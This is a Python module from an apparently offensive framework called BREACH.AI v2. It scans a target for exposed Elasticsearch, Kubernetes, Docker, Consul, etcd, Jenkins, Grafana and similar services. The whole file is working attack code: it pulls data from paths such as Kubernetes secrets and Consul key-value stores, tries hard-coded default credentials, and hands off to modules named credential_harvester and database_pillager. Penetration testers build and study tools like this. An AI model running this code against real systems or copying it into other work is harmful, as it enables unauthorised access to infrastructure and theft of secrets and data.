"""
BREACH.AI v2 - Service Breaker

Exploits exposed services like Redis, Elasticsearch, MongoDB, Memcached,
Kubernetes API, and other commonly misconfigured services.
"""

import asyncio
import json
import re
from urllib.parse import urljoin

from backend.breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from backend.breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# Service endpoints and detection patterns
EXPOSED_SERVICES = {
    "elasticsearch": {
        "ports": [9200, 9300],
        "paths": ["/", "/_cat/indices", "/_search?q=*", "/_cluster/health"],
        "indicators": ["cluster_name", "tagline", "lucene_version", "elasticsearch"],
        "data_paths": ["/_search?q=*&size=10", "/_cat/indices?v"],
    },
    "kibana": {
        "ports": [5601],
        "paths": ["/api/status", "/app/kibana"],
        "indicators": ["kibana", "status", "elasticsearch"],
        "data_paths": [],
    },
    "redis": {
        "ports": [6379],
        "paths": [],  # Redis is TCP, not HTTP
        "indicators": [],
        "http_proxy_paths": ["/redis", "/api/redis"],
    },
    "mongodb": {
        "ports": [27017, 27018],
        "paths": [],  # MongoDB is TCP
        "indicators": [],
        "http_proxy_paths": ["/api/mongo", "/mongo"],
    },
    "couchdb": {
        "ports": [5984],
        "paths": ["/", "/_all_dbs", "/_utils"],
        "indicators": ["couchdb", "Welcome", "version"],
        "data_paths": ["/_all_dbs"],
    },
    "kubernetes_api": {
        "ports": [6443, 8443, 443],
        "paths": ["/api", "/api/v1", "/api/v1/pods", "/api/v1/secrets", "/api/v1/namespaces"],
        "indicators": ["apiVersion", "kind", "kubernetes"],
        "data_paths": ["/api/v1/pods", "/api/v1/secrets", "/api/v1/configmaps"],
    },
    "docker_api": {
        "ports": [2375, 2376],
        "paths": ["/version", "/info", "/containers/json", "/images/json"],
        "indicators": ["ApiVersion", "Docker", "Containers", "Images"],
        "data_paths": ["/containers/json", "/images/json"],
    },
    "consul": {
        "ports": [8500],
        "paths": ["/v1/agent/self", "/v1/catalog/services", "/v1/kv/?recurse"],
        "indicators": ["consul", "Config", "Member"],
        "data_paths": ["/v1/kv/?recurse", "/v1/catalog/services"],
    },
    "etcd": {
        "ports": [2379],
        "paths": ["/version", "/v2/keys", "/v2/keys/?recursive=true"],
        "indicators": ["etcdserver", "etcdcluster"],
        "data_paths": ["/v2/keys/?recursive=true"],
    },
    "prometheus": {
        "ports": [9090],
        "paths": ["/api/v1/status/config", "/api/v1/targets", "/metrics"],
        "indicators": ["prometheus", "scrape", "alertmanager"],
        "data_paths": ["/api/v1/targets", "/api/v1/status/config"],
    },
    "grafana": {
        "ports": [3000],
        "paths": ["/api/org", "/api/users", "/api/datasources"],
        "indicators": ["grafana", "datasource", "dashboard"],
        "data_paths": ["/api/datasources", "/api/users"],
    },
    "jenkins": {
        "ports": [8080],
        "paths": ["/api/json", "/script", "/credentials"],
        "indicators": ["jenkins", "hudson", "crumb"],
        "data_paths": ["/api/json?tree=jobs[name,url]"],
    },
    "solr": {
        "ports": [8983],
        "paths": ["/solr/admin/info/system", "/solr/admin/cores"],
        "indicators": ["solr", "lucene", "responseHeader"],
        "data_paths": ["/solr/admin/cores?action=STATUS"],
    },
    "memcached": {
        "ports": [11211],
        "paths": [],  # TCP protocol
        "indicators": [],
        "http_proxy_paths": ["/memcached", "/api/cache"],
    },
    "rabbitmq": {
        "ports": [15672],
        "paths": ["/api/overview", "/api/queues", "/api/exchanges"],
        "indicators": ["rabbitmq", "erlang", "queue"],
        "data_paths": ["/api/queues", "/api/users"],
    },
}

# Default credentials to test
DEFAULT_CREDS = {
    "elasticsearch": [],  # Usually no auth
    "kibana": [("elastic", "changeme"), ("admin", "admin")],
    "jenkins": [("admin", "admin"), ("admin", "password"), ("jenkins", "jenkins")],
    "grafana": [("admin", "admin"), ("admin", "grafana")],
    "rabbitmq": [("guest", "guest"), ("admin", "admin")],
    "consul": [],
    "prometheus": [],
}


@register_module
class ServiceBreaker(InitialAccessModule):
    """
    Service Breaker - Exploit exposed infrastructure services.

    Techniques:
    - Unauthenticated service access
    - Default credential testing
    - API endpoint enumeration
    - Data extraction from exposed services
    - Service-specific exploitation
    """

    info = ModuleInfo(
        name="service_breaker",
        phase=BreachPhase.INITIAL_ACCESS,
        description="Exploit exposed Redis, Elasticsearch, K8s, and other services",
        author="BREACH.AI",
        techniques=["T1190", "T1133"],  # Exploit Public-Facing, External Remote Services
        platforms=["infrastructure", "cloud"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.ADMIN,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if we should scan for exposed services."""
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Scan for and exploit exposed services."""
        self._start_execution()

        vulns = []
        target = config.target.rstrip("/")

        # Get discovered ports from recon
        discovered_ports = config.chain_data.get("open_ports", [])

        # Test each service type
        for service_name, service_config in EXPOSED_SERVICES.items():
            service_vulns = await self._test_service(
                target, service_name, service_config, discovered_ports, config
            )
            vulns.extend(service_vulns)

        # Collect evidence
        for vuln in vulns:
            severity = Severity.CRITICAL if vuln.get("data_exposed") else Severity.HIGH

            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"Exposed Service: {vuln['service']}",
                content={
                    "service": vuln["service"],
                    "endpoint": vuln["endpoint"],
                    "version": vuln.get("version", "unknown"),
                    "auth_required": vuln.get("auth_required", False),
                    "data_preview": str(vuln.get("data", ""))[:500],
                },
                proves=f"Unauthenticated access to {vuln['service']}",
                severity=severity,
            )

            # If we got data, add sample
            if vuln.get("data_exposed") and vuln.get("data"):
                self._add_evidence(
                    evidence_type=EvidenceType.DATA_SAMPLE,
                    description=f"Data from {vuln['service']}",
                    content=vuln["data"][:10] if isinstance(vuln["data"], list) else vuln["data"],
                    proves=f"Sensitive data accessible from {vuln['service']}",
                    severity=Severity.CRITICAL,
                )

        # Determine access level
        access_gained = None
        high_value_services = ["kubernetes_api", "docker_api", "jenkins", "consul", "etcd"]
        if any(v["service"] in high_value_services for v in vulns):
            access_gained = AccessLevel.ADMIN
        elif any(v.get("data_exposed") for v in vulns):
            access_gained = AccessLevel.DATABASE
        elif vulns:
            access_gained = AccessLevel.USER

        return self._create_result(
            success=len(vulns) > 0,
            action="service_exploitation",
            details=f"Found {len(vulns)} exposed/vulnerable services",
            access_gained=access_gained,
            data_extracted={"exposed_services": vulns} if vulns else None,
            enables_modules=["container_escaper", "credential_harvester", "database_pillager"] if vulns else [],
        )

    async def _test_service(
        self,
        target: str,
        service_name: str,
        service_config: dict,
        discovered_ports: list,
        config: ModuleConfig
    ) -> list:
        """Test a specific service type."""
        vulns = []

        # Build URLs to test
        test_urls = []

        # Test on discovered ports
        for port in service_config["ports"]:
            if port in discovered_ports or not discovered_ports:
                for path in service_config["paths"]:
                    if port in [443, 8443]:
                        test_urls.append(f"https://{self._get_host(target)}:{port}{path}")
                    else:
                        test_urls.append(f"http://{self._get_host(target)}:{port}{path}")

        # Also test on default target (proxy scenarios)
        for path in service_config["paths"]:
            test_urls.append(urljoin(target, path))

        # Test HTTP proxy paths if defined
        for path in service_config.get("http_proxy_paths", []):
            test_urls.append(urljoin(target, path))

        # Test each URL
        for url in test_urls[:10]:  # Limit to 10 tests per service
            response = await self._safe_request("GET", url, timeout=10)

            if response and self._is_service_response(response, service_config):
                vuln = {
                    "service": service_name,
                    "endpoint": url,
                    "version": self._extract_version(response, service_name),
                    "auth_required": response.get("status_code") == 401,
                }

                # Try to extract data if unauthenticated
                if response.get("status_code") == 200:
                    data = await self._extract_service_data(
                        target, service_name, service_config, url
                    )
                    if data:
                        vuln["data_exposed"] = True
                        vuln["data"] = data

                vulns.append(vuln)
                break  # Found this service

        # Test default credentials if service requires auth
        if not vulns:
            cred_vulns = await self._test_default_creds(target, service_name, service_config)
            vulns.extend(cred_vulns)

        return vulns

    async def _extract_service_data(
        self,
        target: str,
        service_name: str,
        service_config: dict,
        base_url: str
    ) -> list:
        """Extract data from exposed service."""
        data = []

        for data_path in service_config.get("data_paths", [])[:3]:
            # Build URL relative to discovered endpoint
            if "://" in base_url:
                from urllib.parse import urlparse
                parsed = urlparse(base_url)
                url = f"{parsed.scheme}://{parsed.netloc}{data_path}"
            else:
                url = urljoin(target, data_path)

            response = await self._safe_request("GET", url, timeout=10)

            if response and response.get("status_code") == 200:
                try:
                    json_data = json.loads(response.get("text", ""))
                    if isinstance(json_data, list):
                        data.extend(json_data[:10])
                    elif isinstance(json_data, dict):
                        data.append(json_data)
                except json.JSONDecodeError:
                    # Not JSON, store raw text
                    text = response.get("text", "")[:1000]
                    if text:
                        data.append({"raw": text})

        return data

    async def _test_default_creds(
        self,
        target: str,
        service_name: str,
        service_config: dict
    ) -> list:
        """Test default credentials for a service."""
        vulns = []

        creds = DEFAULT_CREDS.get(service_name, [])
        if not creds:
            return vulns

        for port in service_config["ports"][:2]:
            base_url = f"http://{self._get_host(target)}:{port}"

            for username, password in creds:
                # Try basic auth on first path
                for path in service_config["paths"][:2]:
                    url = f"{base_url}{path}"

                    response = await self._safe_request(
                        "GET",
                        url,
                        auth=(username, password),
                        timeout=10,
                    )

                    if response and response.get("status_code") == 200:
                        if self._is_service_response(response, service_config):
                            vulns.append({
                                "service": service_name,
                                "endpoint": url,
                                "auth_required": True,
                                "credentials": f"{username}:***",
                                "default_creds": True,
                            })
                            return vulns  # Found valid creds

        return vulns

    def _is_service_response(self, response: dict, service_config: dict) -> bool:
        """Check if response matches expected service indicators."""
        if not response or response.get("status_code") not in [200, 401, 403]:
            return False

        text = response.get("text", "")
        indicators = service_config.get("indicators", [])

        for indicator in indicators:
            if indicator.lower() in text.lower():
                return True

        return False

    def _extract_version(self, response: dict, service_name: str) -> str:
        """Extract version info from service response."""
        text = response.get("text", "")

        try:
            data = json.loads(text)

            # Common version fields
            version_fields = ["version", "Version", "server_version", "number"]
            for field in version_fields:
                if field in data:
                    return str(data[field])

                # Nested version info
                if "version" in data and isinstance(data["version"], dict):
                    if "number" in data["version"]:
                        return data["version"]["number"]

        except json.JSONDecodeError:
            # Try regex for version patterns
            version_pattern = r'(?:version|ver)["\s:]+([0-9]+\.[0-9]+(?:\.[0-9]+)?)'
            match = re.search(version_pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)

        return "unknown"

    def _get_host(self, target: str) -> str:
        """Extract host from target URL."""
        from urllib.parse import urlparse
        parsed = urlparse(target)
        return parsed.hostname or target.replace("http://", "").replace("https://", "").split("/")[0]
